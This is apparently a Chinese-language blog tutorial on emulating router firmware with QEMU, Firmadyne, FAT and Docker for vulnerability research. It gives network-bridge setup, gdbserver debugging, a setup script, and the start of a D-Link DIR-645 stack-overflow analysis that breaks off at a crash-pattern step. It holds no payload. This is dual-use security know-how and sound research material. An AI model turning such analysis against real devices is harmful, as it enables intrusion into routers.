root</span><br><span class="line">Password: </span><br><span class="line">Last login: Wed Jul  8 05:16:50 UTC 2020 on ttyS0</span><br><span class="line">Linux debian-mips 2.6.32-5-4kc-malta <span class="comment">#1 Tue Sep 24 00:02:22 UTC 2013 mips</span></span><br><span class="line">root@debian-mips:~<span class="comment"># ifconfig </span></span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 52:54:00:12:34:56  </span><br><span class="line">          inet6 addr: fe80::5054:ff:fe12:3456/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:16 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:2988 (2.9 KiB)</span><br><span class="line">          Interrupt:10 Base address:0x1020 </span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:16436  Metric:1</span><br><span class="line">          RX packets:9 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:9 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:672 (672.0 B)  TX bytes:672 (672.0 B)</span><br><span class="line"></span><br><span class="line">root@debian-mips:~<span class="comment"># ifconfig eth0 192.168.164.140/24</span></span><br><span class="line">root@debian-mips:~<span class="comment"># ifconfig </span></span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 52:54:00:12:34:56  </span><br><span class="line">          inet addr:192.168.164.140  Bcast:192.168.164.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::5054:ff:fe12:3456/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:87 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:16 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:5220 (5.0 KiB)  TX bytes:2988 (2.9 KiB)</span><br><span class="line">          Interrupt:10 Base address:0x1020 </span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:16436  Metric:1</span><br><span class="line">          RX packets:9 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:9 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:672 (672.0 B)  TX bytes:672 (672.0 B)</span><br><span class="line"></span><br><span class="line">root@debian-mips:~<span class="comment"># ping 192.168.164.139</span></span><br><span class="line">PING 192.168.164.139 (192.168.164.139) 56(84) bytes of data.</span><br><span class="line">64 bytes from 192.168.164.139: icmp_req=1 ttl=64 time=14.7 ms</span><br><span class="line"></span><br><span class="line">root@debian-mips:~<span class="comment"># ping 192.168.164.137</span></span><br><span class="line">PING 192.168.164.137 (192.168.164.137) 56(84) bytes of data.</span><br><span class="line">64 bytes from 192.168.164.137: icmp_req=1 ttl=64 time=2.28 ms</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">参数说明：</span><br><span class="line">-M 指定开发板 你能够使用-M ?參数来获取该qemu版本号支持的全部单板</span><br><span class="line">-kernel 内核镜像路径</span><br><span class="line">-hda/-hdb IDE硬盘镜像</span><br><span class="line">-append 内核启动参数 内核命令行</span><br><span class="line">-s 等同于-g 1234</span><br></pre></td></tr></table></figure><p>然后在物理机用python启动一个简单的ftp服务器，在虚拟机里面接受固件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ tar -cvf squashfs-root.tar squashfs-root/</span><br><span class="line">$ python -m SimpleHTTPServer 8888</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8888 ...</span><br><span class="line">192.168.164.140 - - [08/Jul/2020 00:33:18] <span class="string">"GET /squashfs-root.tar HTTP/1.0"</span> 200</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@debian-mips:~<span class="comment"># wget http://192.168.164.137:8888/squashfs-root.tar</span></span><br><span class="line">--2020-07-08 07:33:18--  http://192.168.164.137:8888/squashfs-root.tar</span><br><span class="line">Connecting to 192.168.164.137:8888... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 29675520 (28M) [application/x-tar]</span><br><span class="line">Saving to: “squashfs-root.tar”</span><br><span class="line"></span><br><span class="line">100%[======================================&gt;] 29,675,520  2.96M/s   <span class="keyword">in</span> 8.0s    </span><br><span class="line"></span><br><span class="line">2020-07-08 07:33:26 (3.53 MB/s) - “squashfs-root.tar” saved [29675520/29675520]</span><br><span class="line"></span><br><span class="line">root@debian-mips:~<span class="comment"># ls</span></span><br><span class="line">squashfs-root.tar</span><br><span class="line">root@debian-mips:~<span class="comment"># tar -xvf squashfs-root.tar</span></span><br></pre></td></tr></table></figure><p>最后挂载文件，就可以开启固件里面的服务了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mount -o <span class="built_in">bind</span> /dev/ ./squashfs-root/dev/</span><br><span class="line">mount -t proc /proc/ ./squashfs-root/proc/</span><br><span class="line">chroot ./squashfs-root sh</span><br></pre></td></tr></table></figure><p>以上配置网络的方法访问不了外网，而且手动配置的ip可能会失效，需要重新配置。</p><p>启动gdb和gdbserver开始调试</p><p>在qemu虚拟机里面运行下面的命令来启动调试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdbserver.mipsbe attach 0.0.0.0:12345 pid</span><br><span class="line">或者 </span><br><span class="line">gdbserver.mipsbe 0.0.0.0:6666 ./test</span><br></pre></td></tr></table></figure><p>在Ubuntu主机里面运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch</span><br><span class="line">gef➤ <span class="built_in">set</span> architecture mips      设置架构gdb-multiarch</span><br><span class="line">gef➤ <span class="built_in">set</span> architecture mips      设置架构</span><br><span class="line">The target architecture is assumed to be mips</span><br><span class="line">gef➤ gef-remote -q 192.168.1.20:2333     远程链接    或者target remote 192.168.1.20:2333</span><br><span class="line">gef➤ handle SIG32 pass            忽略一些信号，不然gdb会到处停很难受</span><br><span class="line">gef➤ handle SIG33 pass</span><br><span class="line">gef➤ handle SIG43 pass</span><br></pre></td></tr></table></figure><p>我把上述过程写了脚本方便启动</p><h4 id="start-py"><a href="#start-py" class="headerlink" title="start.py"></a>start.py</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># vim:fenc=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">cmd = <span class="string">'# '</span></span><br><span class="line">current_path = os.getcwd()</span><br><span class="line">firware_path=<span class="string">'/home/iot/tools/firmware-analysis-toolkit/firmadyne/vulfirmware/example1/_dir645_FW_103.bin.extracted/'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(r)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'login: '</span>, <span class="string">'root'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Password: '</span>, <span class="string">'root'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'ifconfig eth0 192.168.1.1'</span>)</span><br><span class="line">    r2=process(<span class="string">'sh'</span>)</span><br><span class="line">    r2.sendlineafter(<span class="string">'$ '</span>,<span class="string">'cd &#123;&#125;'</span>.format(firware_path))</span><br><span class="line">    r2.sendlineafter(<span class="string">'$ '</span>,<span class="string">'tar -cvf squashfs-root.tar squashfs-root/'</span>)</span><br><span class="line">    r2.sendlineafter(<span class="string">'$ '</span>,<span class="string">'python -m SimpleHTTPServer 8888'</span>)</span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'wget http://192.168.1.2:8888/squashfs-root.tar'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'tar -xvf squashfs-root.tar'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'mount -o bind /dev/ ./squashfs-root/dev/'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'mount -t proc /proc/ ./squashfs-root/proc/'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'chroot ./squashfs-root sh'</span>)</span><br><span class="line">    r2.close()</span><br><span class="line">    r.interactive()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    os.system(<span class="string">'sudo tunctl -t tap0 -u iot'</span>)</span><br><span class="line">    os.system(<span class="string">'sudo ifconfig tap0 192.168.1.2/24'</span>)</span><br><span class="line"></span><br><span class="line">    exploit(process(<span class="string">'./run.sh'</span>))</span><br></pre></td></tr></table></figure><h4 id="run-sh"><a href="#run-sh" class="headerlink" title="run.sh"></a>run.sh</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/sh</span></span><br><span class="line">qemu-system-mipsel -M malta \</span><br><span class="line">-kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">-hda debian_wheezy_mipsel_standard.qcow2 \</span><br><span class="line">-append <span class="string">"root=/dev/sda1 console=tty0"</span> \</span><br><span class="line">-net nic -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">-nographic</span><br></pre></td></tr></table></figure><h4 id="配置qemu-system网络"><a href="#配置qemu-system网络" class="headerlink" title="配置qemu-system网络"></a>配置qemu-system网络</h4><p>qemu想要访问外网，只需再创建一个网桥，将tap0接口添加到网桥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install uml-utilities bridge-utils</span><br></pre></td></tr></table></figure><p>创建网桥，名字是 <code>virbr0</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo brctl addbr virbr0 </span><br><span class="line">sudo ifconfig virbr0 192.168.122.1/24 up</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">iot@attifyos ~/t/firmware-analysis-toolkit&gt; sudo brctl addbr virbr0</span><br><span class="line">iot@attifyos ~/t/firmware-analysis-toolkit&gt; sudo ifconfig virbr0 192.168.122.1/24 up</span><br><span class="line">iot@attifyos ~/t/firmware-analysis-toolkit&gt; ifconfig </span><br><span class="line">ens32: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.164.137  netmask 255.255.255.0  broadcast 192.168.164.255</span><br><span class="line">        inet6 fe80::f47c:851e:6b2a:ca13  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:44:85:45  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 135232  bytes 156937910 (156.9 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 45471  bytes 2897770 (2.8 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 10571  bytes 1888940 (1.8 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 10571  bytes 1888940 (1.8 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">virbr0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.122.1  netmask 255.255.255.0  broadcast 192.168.122.255</span><br><span class="line">        inet6 fe80::a061:b2ff:fea9:466d  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether a2:61:b2:a9:46:6d  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 22  bytes 2766 (2.7 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><p>创建 <code>tap</code> 接口，名字为 <code>tap0</code>，并添加到网桥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo tunctl -t tap0 </span><br><span class="line">sudo ifconfig tap0 192.168.122.11/24 up</span><br><span class="line">sudo brctl addif virbr0 tap0</span><br></pre></td></tr></table></figure><p>修改主机网络接口配置文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sudo</span> vim /etc/network/interfaces</span><br></pre></td></tr></table></figure><p>如果网卡名不是eth0换成对应网卡名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># interfaces(5) file used by ifup(8) and ifdown(8)</span></span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line">auto virbr0</span><br><span class="line">iface virbr0 inet dhcp</span><br><span class="line">   bridge_ports eth0</span><br></pre></td></tr></table></figure><p>重启服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /etc/init.d/networking restart</span><br></pre></td></tr></table></figure><p>启动qemu</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append <span class="string">"root=/dev/sda1 console=tty0"</span> -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</span><br></pre></td></tr></table></figure><p>然后配置ip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 192.168.122.12/24 up</span><br></pre></td></tr></table></figure><p>接下来就可以访问外网了</p><h3 id="Firmadyne"><a href="#Firmadyne" class="headerlink" title="Firmadyne"></a>Firmadyne</h3><p>Firmadyne依赖于binwalk，qemu，这个工具可以简化模拟路由器的流程，但不可以调试固件</p><p>将项目克隆下来，并执行setup.sh脚本，会安装所依赖的库和环境，并配置postgresql数据库，数据库用户和密码都为<code>firmadyne</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> --recursive https://github.com/firmadyne/firmadyne.git</span><br><span class="line">$ <span class="built_in">cd</span> firmadyne &amp;&amp; sudo ./setup.sh</span><br></pre></td></tr></table></figure><p>firmadyne工作流程如下：</p><p>用extractor 提取filesystem，并存储在数据库里和images目录下 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">iot@attifyos ~/t/f/firmadyne&gt; ./sources/extractor/extractor.py -b dlink -sql 127.0.0.1 -np -nk <span class="string">"DIR823GA1_FW102B03.bin"</span> images</span><br><span class="line">&gt;&gt; Database Image ID: 1</span><br><span class="line"></span><br><span class="line">/home/iot/tools/firmware-analysis-toolkit/firmadyne/DIR823GA1_FW102B03.bin</span><br><span class="line">&gt;&gt; MD5: 064dd035f7e7be72949166c37f5dd432</span><br><span class="line">&gt;&gt; Tag: 1</span><br><span class="line">&gt;&gt; Temp: /tmp/tmp6s25ib68</span><br><span class="line">&gt;&gt; Status: Kernel: True, Rootfs: False, Do_Kernel: False,                 Do_Rootfs: True</span><br><span class="line">&gt;&gt; Recursing into archive ...</span><br><span class="line">&gt;&gt;&gt;&gt; Squashfs filesystem, little endian, version 4.0, compression:xz, size: 4006046 bytes, 917 inodes, blocksize: 131072 bytes, created: 2038-02-22 10:46:24</span><br><span class="line">&gt;&gt;&gt;&gt; Found Linux filesystem <span class="keyword">in</span> /tmp/tmp6s25ib68/_DIR823GA1_FW102B03.bin.extracted/squashfs-root!</span><br><span class="line">&gt;&gt; Skipping: completed!</span><br><span class="line">&gt;&gt; Cleaning up /tmp/tmp6s25ib68...</span><br><span class="line">iot@attifyos ~/t/f/firmadyne&gt; ls images/</span><br><span class="line">1.tar.gz  README.md</span><br></pre></td></tr></table></figure><p>识别固件架构</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iot@attifyos ~/t/f/firmadyne&gt; ./scripts/getArch.sh ./images/1.tar.gz</span><br><span class="line">./bin/busybox: mipsel</span><br></pre></td></tr></table></figure><p>将固件系统内容存储到数据库的image表中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iot@attifyos ~/t/f/firmadyne&gt; ./scripts/tar2db.py -i 1 -f ./images/1.tar.gz</span><br></pre></td></tr></table></figure><p>为固件创建qemu磁盘镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">iot@attifyos ~/t/f/firmadyne&gt; sudo -SE ./scripts/makeImage.sh 1 mipsel</span><br><span class="line">----Running----</span><br><span class="line">----Copying Filesystem Tarball----</span><br><span class="line">----Creating QEMU Image----</span><br><span class="line">Formatting <span class="string">'/home/iot/tools/firmware-analysis-toolkit/firmadyne/scratch//1//image.raw'</span>, fmt=raw size=1073741824</span><br><span class="line">----Creating Partition Table----</span><br><span class="line"></span><br><span class="line">Welcome to fdisk (util-linux 2.31.1).</span><br><span class="line">Changes will remain <span class="keyword">in</span> memory only, until you decide to write them.</span><br><span class="line">Be careful before using the write <span class="built_in">command</span>.</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>为qemu建立虚拟接口，并生成run.sh脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">iot@attifyos ~/t/f/firmadyne&gt; ./scripts/inferNetwork.sh 1 mipsel</span><br><span class="line">Running firmware 1: terminating after 60 secs...</span><br><span class="line"></span><br><span class="line">qemu-system-mipsel: terminating on signal 2 from pid 25160 (timeout)</span><br><span class="line">Inferring network...</span><br><span class="line">Interfaces: [(<span class="string">'br0'</span>, <span class="string">'192.168.0.1'</span>), (<span class="string">'br1'</span>, <span class="string">'192.168.100.1'</span>)]</span><br><span class="line">Done!</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">iot@attifyos ~/t/f/firmadyne&gt; ls scratch/1/</span><br><span class="line">image/  image.raw  qemu.initial.serial.log  run.sh*</span><br></pre></td></tr></table></figure><p>使用指定的网络配置模拟运行固件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">iot@attifyos ~/t/f/firmadyne&gt; sudo ./scratch/1/run.sh </span><br><span class="line">Creating TAP device tap1_0...</span><br><span class="line">Set <span class="string">'tap1_0'</span> persistent and owned by uid 0</span><br><span class="line">Bringing up TAP device...</span><br><span class="line">Adding route to 192.168.0.1...</span><br><span class="line">Starting firmware emulation... use Ctrl<span class="_">-a</span> + x to <span class="built_in">exit</span></span><br><span class="line">[    0.000000] Linux version 2.6.32.70 (vagrant@vagrant-ubuntu-trusty-64) (gcc version 5.3.0 (GCC) ) <span class="comment">#1 Thu Feb 18 01:44:57 UTC 2016</span></span><br></pre></td></tr></table></figure><p>系统运行成功，主机可以访问，日志记录到<code>./scratch/1/qemu.final.serial.log</code>中</p><p><img alt="image-20200709102510641" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200709102510641.png" class="lozad"></p><p>总结 ：</p><p>firmadyne简化了固件模拟的流程，并自动配置网络。其内部工作原理和qemu-system一样，配置网络的过程也是用tunctl 来添加虚拟网卡。方便的是会生成qemu镜像，并把固件信息保存到了数据库里，下一次使用会更加方便些。</p><h3 id="Fat"><a href="#Fat" class="headerlink" title="Fat"></a>Fat</h3><p>fat只需一条命令就可以模拟路由器固件，他是把firmadyne的流程更简化了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/attify/firmware-analysis-toolkit</span><br><span class="line"><span class="built_in">cd</span> firmware-analysis-toolkit</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><p>但安装不容易成功，主要是依赖的东西太多了，可以使用attifyOs虚拟机，里面已经集成好了。</p><p>一条命名即可模拟路由器固件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fat.py DIR823GA1_FW102B03.bin</span><br></pre></td></tr></table></figure><h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><p>docker是真的香啊，什么环境都有别人搭好的，参考<a href="https://hub.docker.com/r/waveburst/" target="_blank" rel="noopener">https://hub.docker.com/r/waveburst/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo docker pull waveburst/qemu-system-mips</span><br><span class="line">sudo docker pull waveburst/qemu-system-mipsel</span><br><span class="line">sudo docker pull waveburst/qemu-system-armhf</span><br><span class="line">sudo docker pull waveburst/qemu-system-armel</span><br></pre></td></tr></table></figure><p>使用如下：</p><p>First you need to run the container with port mapped to 5555 for ssh control.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -p 5555:5555 waveburst/qemu-system-mips</span><br></pre></td></tr></table></figure><p>Now you can simply log in to your container using ‘<code>mips:mips</code>‘ credentials</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 5555 mips@localhost</span><br></pre></td></tr></table></figure><p>You can verity that you are inside the qemu-system simply by executing ‘<code>uname -a</code>‘ command. It should return:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux docker-mips-debian 4.9.0-8-4kc-malta #1 Debian 4.9.130-2 (2018-10-27) mips GNU/Linux</span><br></pre></td></tr></table></figure><h2 id="OpenWRT"><a href="#OpenWRT" class="headerlink" title="OpenWRT"></a>OpenWRT</h2><p>OpenWRT是一个高度模块化、高度自动化的嵌入式Linux系统，拥有强大的网络组件和扩展性，常常被用于工控设备、电话、小型机器人、智能家居、路由器以及VOIP设备中。 同时，它还提供了100多个已编译好的软件，而且数量还在不断增加，而 OpenWrt SDK 更简化了开发软件的工序</p><p>而且OpenWRT支持各种处理器架构，无论是对ARM，X86，PowerPC或者MIPS都有很好的支持。</p><p><img alt="image-20200709171345194" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200709171345194.png" class="lozad"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-arm -M virt -m 64 -kernel zImage-initramfs -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</span><br></pre></td></tr></table></figure><h2 id="IOT常见漏洞"><a href="#IOT常见漏洞" class="headerlink" title="IOT常见漏洞"></a>IOT常见漏洞</h2><p><img alt="image-20200710092958488" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200710092958488.png" class="lozad"></p><h2 id="D-Link-DIR-645栈溢出分析"><a href="#D-Link-DIR-645栈溢出分析" class="headerlink" title="D-Link DIR-645栈溢出分析"></a>D-Link DIR-645栈溢出分析</h2><p>漏洞描述</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">iot@attifyos ~/f/e/_/squashfs-root&gt; cd var/</span><br><span class="line">iot@attifyos ~/f/e/_/s/var&gt; mkdir run</span><br><span class="line">iot@attifyos ~/f/e/_/s/var&gt; cd run/</span><br><span class="line">iot@attifyos ~/f/e/_/s/v/run&gt; ls</span><br><span class="line">iot@attifyos ~/f/e/_/s/v/run&gt; touch hash</span><br><span class="line">iot@attifyos ~/f/e/_/s/v/run&gt; touch password</span><br></pre></td></tr></table></figure><p>### </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">iot@attifyos ~/f/example1&gt; python pattern.py -c -l 300 -f _dir645_FW_103.bin.extracted/squashfs-root/var/run/<span class="built_in">hash</span> </span><br><span class="line">[*] Create pattern string contains 300 characters ok!</span><br><span class="line">[+] output to _dir645_FW_103.bin.extracted/squashfs-root/var/run/<span 